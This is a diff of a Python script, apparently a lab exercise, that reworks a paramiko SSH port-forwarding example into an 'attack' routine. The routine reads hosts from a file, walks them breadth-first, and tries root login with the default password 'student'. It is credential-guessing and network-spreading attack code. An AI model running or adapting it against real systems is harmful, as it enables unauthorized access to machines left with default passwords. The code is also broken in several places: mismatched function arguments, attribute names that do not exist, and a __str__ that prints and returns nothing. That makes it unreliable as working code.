@@ -13,6 +13,9 @@ import sys
 g_verbose = True
 
 DEFAULT_PASS = "student"
+ROOT = "root"
+q = Queue.Queue()
+ip_list = []
 
 class Computer:
     def __init__(self, ip, ssh_port):
@@ -24,6 +27,9 @@ class Computer:
         # keys = accountName
         # values = password
         self.accounts = {}
+
+    def __str__(self):
+        print (self.ip, self.ssh_port, self.accounts)
 
 class ForwardServer (SocketServer.ThreadingTCPServer):
     daemon_threads = True
@@ -86,21 +92,26 @@ def get_host_port(data):
     args[1] = int(args[1])
     return args
 
-def begin_attack(client, comp_queue):
+def begin_attack(client):
     print "Beginning attack"
-    verbose("Connecting to ssh host %s:%d ..." % (server[0], server[1]))
-    try:
-        client.connect(server[0], server[1], username=options.user, key_filename=options.keyfile, look_for_keys=options.look_for_keys, password=password)
-    except Exception as e:
-        print('*** Failed to connect to %s:%d: %r' % (server[0], server[1], e))
+
+    # executes BFS over network
+    while not q.empty():
+        # gets the next computer in BFS
+        server = q.get()
+        verbose("Connecting to ssh host %s:%d ..." % (server.host, server.port))
+        try:
+            client.connect(server.host, server.port, username=ROOT, password=DEFAULT_PASS)
+        except Exception as e:
+            print('*** Failed to connect to %s:%d: %r' % (server.host, server.port, e))
 
 
-    verbose('Now forwarding port %d to %s:%d ...' % (options.port, remote[0], remote[1]))
+    # verbose('Now forwarding port %d to %s:%d ...' % (options.port, remote[0], remote[1]))
 
-    try:
-        forward_tunnel(options.port, remote[0], remote[1], client.get_transport())
-    except KeyboardInterrupt:
-        print('C-c: Port forwarding stopped.')
+    # try:
+    #     forward_tunnel(options.port, remote[0], remote[1], client.get_transport())
+    # except KeyboardInterrupt:
+    #     print('C-c: Port forwarding stopped.')
 
 
 if __name__ == "__main__":
@@ -109,4 +120,16 @@ if __name__ == "__main__":
     client.load_system_host_keys()
     client.set_missing_host_key_policy(paramiko.WarningPolicy())
 
-    
+
+    f = open("servers.txt", "r")
+    computers = f.readlines()
+    f.close()
+
+    # initialize the queue with starting computer list
+    for c in computers:
+        host, port = get_host_port(c)
+        compObj = Computer(host, port)
+        ip_list.append(host)
+        q.put(compObj)
+
+    begin_attack(client, q)
